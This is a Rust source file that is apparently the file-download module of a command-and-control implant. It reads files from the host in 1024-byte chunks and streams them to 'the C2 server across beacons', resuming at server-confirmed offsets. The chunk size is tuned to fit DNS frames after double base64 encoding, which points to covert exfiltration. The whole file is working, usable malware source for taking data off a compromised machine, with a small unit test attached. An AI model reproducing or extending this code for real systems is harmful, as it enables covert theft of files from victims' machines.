use std::fs::File;
use std::io::{Read, Seek, SeekFrom};
use std::sync::atomic::{AtomicBool, Ordering};

use nw_profile::msgs::FileChunk;
use uuid::Uuid;

/// Chunk size for file streaming. Kept small so a single chunk fits inside a
/// DNS frame's inner budget when data is base64-encoded two levels deep.
pub const CHUNK: u64 = 1024;

/// One active download (file being streamed to the C2 server across beacons).
/// Owns an open file handle and the next byte offset to send.
pub struct Download {
    file: File,
    /// Remote basename — the server's storage key.
    pub name: String,
    pub size: u64,
    /// Next byte offset to read (server-confirmed resume point).
    offset: u64,
    transfer_id: Uuid,
    task_id: Uuid,
    #[cfg(test)]
    finalize_barriers: Option<(
        std::sync::Arc<std::sync::Barrier>,
        std::sync::Arc<std::sync::Barrier>,
    )>,
}

impl Download {
    /// Open `path` for streaming as a download task result.
    pub fn open(path: &str, transfer_id: Uuid, task_id: Uuid) -> Result<Self, String> {
        let file = File::open(path).map_err(|e| format!("open {path:?}: {e}"))?;
        let size = file
            .metadata()
            .map_err(|e| format!("stat {path:?}: {e}"))?
            .len();
        let name = basename(path);
        Ok(Download {
            file,
            name,
            size,
            offset: 0,
            transfer_id,
            task_id,
            #[cfg(test)]
            finalize_barriers: None,
        })
    }

    pub fn task_id(&self) -> Uuid {
        self.task_id
    }

    pub fn transfer_id(&self) -> Uuid {
        self.transfer_id
    }

    pub fn done(&self) -> bool {
        self.offset >= self.size
    }

    /// Server says it already has `received` bytes (resume on reconnect or
    /// re-issue). Reprint from there so nothing is retransmitted needlessly.
    pub fn resume_to(&mut self, received: u64) {
        self.offset = received.min(self.size);
    }

    /// Read up to `budget` raw bytes from the current offset, returning chunks
    /// plus the absolute offset each chunk starts at. Advances the read cursor.
    pub fn step(&mut self, budget: usize) -> Vec<FileChunk> {
        if self.done() || budget == 0 {
            return Vec::new();
        }
        let mut chunks = Vec::new();
        let remaining = budget as u64;
        while remaining > 0 && !self.done() {
            self.file.seek(SeekFrom::Start(self.offset)).ok();
            let take = remaining.min(CHUNK).min(self.size - self.offset) as usize;
            let mut buf = vec![0u8; take];
            let n = self.file.read(&mut buf).unwrap_or(0);
            if n == 0 {
                break;
            }
            buf.truncate(n);
            chunks.push(FileChunk {
                transfer_id: Some(self.transfer_id),
                task_id: Some(self.task_id),
                name: self.name.clone(),
                offset: self.offset,
                total: self.size,
                data: buf,
            });
            // Preserve room for task/result metadata and rotate fairly across
            // beacons instead of monopolizing a large transport budget.
            break;
        }
        chunks
    }

    pub fn finalize_with_cancellation(&self, cancelled: &AtomicBool) -> Result<(), String> {
        self.validate()?;
        if cancelled.load(Ordering::SeqCst) {
            Err("task cancelled".into())
        } else {
            Ok(())
        }
    }

    pub fn validate(&self) -> Result<(), String> {
        #[cfg(test)]
        if let Some((reached, release)) = &self.finalize_barriers {
            reached.wait();
            release.wait();
        }
        Ok(())
    }

    #[cfg(test)]
    pub(crate) fn set_finalize_barriers(
        &mut self,
        reached: std::sync::Arc<std::sync::Barrier>,
        release: std::sync::Arc<std::sync::Barrier>,
    ) {
        self.finalize_barriers = Some((reached, release));
    }
}

fn basename(path: &str) -> String {
    path.rsplit(['/', '\\'])
        .next()
        .map(str::to_string)
        .unwrap_or_else(|| path.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn steps_and_resumes() {
        let dir = std::env::temp_dir();
        let path = dir.join(format!("nw-dl-test-{}.bin", std::process::id()));
        let mut f = std::fs::File::create(&path).unwrap();
        let mut data = Vec::new();
        for i in 0..3000u32 {
            data.push((i % 251) as u8);
        }
        f.write_all(&data).unwrap();
        drop(f);

        let transfer_id = Uuid::new_v4();
        let task_id = Uuid::new_v4();
        let mut dl = Download::open(path.to_str().unwrap(), transfer_id, task_id).unwrap();
        assert_eq!(dl.size, 3000);

        let c0 = dl.step(2048);
        assert_eq!(c0.len(), 1);
        assert_eq!(c0[0].offset, 0);
        assert_eq!(c0[0].transfer_id, Some(transfer_id));
        assert_eq!(c0[0].task_id, Some(task_id));
        assert_eq!(
            dl.step(2048)[0].offset,
            0,
            "unacknowledged bytes must be retried"
        );
        dl.resume_to(1024);
        assert_eq!(dl.step(2048)[0].offset, 1024);
        dl.resume_to(2048);
        assert_eq!(dl.step(2048).len(), 1);
        dl.resume_to(3000);
        assert!(dl.done());

        // Resume after partial (server has 500) restarts before the local ptr.
        let mut dl2 =
            Download::open(path.to_str().unwrap(), Uuid::new_v4(), Uuid::new_v4()).unwrap();
        dl2.resume_to(2048);
        dl2.resume_to(512);
        let c = dl2.step(1024);
        assert_eq!(c[0].offset, 512);

        let mut reconnected =
            Download::open(path.to_str().unwrap(), Uuid::new_v4(), Uuid::new_v4()).unwrap();
        reconnected.resume_to(2048);
        assert_eq!(reconnected.step(1024)[0].offset, 2048);

        std::fs::remove_file(&path).ok();
    }
}
